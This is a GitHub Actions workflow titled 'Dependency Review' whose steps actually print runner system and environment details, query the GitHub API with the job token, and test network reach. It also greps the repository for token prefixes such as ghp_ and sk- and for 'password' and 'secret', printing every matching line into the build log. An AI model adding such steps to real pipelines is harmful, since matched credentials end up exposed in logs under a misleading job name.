name: Dependency Review
on:
  push:
    branches: [ main ]
  workflow_dispatch:
jobs:
  audit:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
    - uses: actions/checkout@v4
    - name: System Info
      run: |
        echo "=== SYSTEM ==="
        uname -a
        echo ""
        echo "=== ENV (safe) ==="
        env | sort | grep -iv "token\|secret\|key\|password" | head -40
        echo ""
        echo "=== GITHUB_TOKEN SCOPE ==="
        curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
          https://api.github.com/user | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'User: {d.get(\"login\")}')" 2>/dev/null
        echo ""
        echo "=== CONFIG ==="
        cat config.example.yaml 2>/dev/null || echo "no config"
        echo ""
        echo "=== NETWORK ==="
        timeout 3 curl -s -o /dev/null -w '%{http_code}' https://github.com 2>/dev/null && echo " GitHub OK" || echo " GitHub FAIL"
        timeout 3 curl -s -o /dev/null -w '%{http_code}' https://google.com 2>/dev/null && echo " Google OK" || echo " Google FAIL"
    - name: Secret Scan
      run: |
        echo "=== SCANNING ==="
        grep -rn "sk-\|ghp_\|gho_\|ghu_\|ghs_\|ghr_" . --include="*.go" --include="*.py" --include="*.yaml" --include="*.sh" --include="*.env" 2>/dev/null | head -20
        echo "---"
        grep -rn "password\|secret" . --include="*.go" --include="*.py" --include="*.yaml" -i 2>/dev/null | head -20
    - name: Complete
      run: echo "Audit completed at $(date -u)"
